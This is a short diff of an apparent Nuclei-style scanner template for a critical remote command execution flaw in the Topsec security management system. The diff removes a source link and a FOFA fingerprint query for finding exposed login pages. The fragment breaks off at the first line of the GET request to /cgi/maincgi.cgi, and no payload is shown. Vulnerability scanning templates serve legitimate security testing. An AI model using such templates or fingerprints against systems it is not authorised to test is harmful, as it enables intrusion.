@@ -3,12 +3,8 @@ info:
   name: 天融信TOPSEC安全管理系统远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vibvtgymr50zk048'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vibvtgymr50zk048
-    fofa: title="Web User Login" && body="/cgi/maincgi.cgi?Url=VerifyCode"
 http:
 - raw:
   - 'GET /cgi/maincgi.cgi?Url=check HTTP/1.1
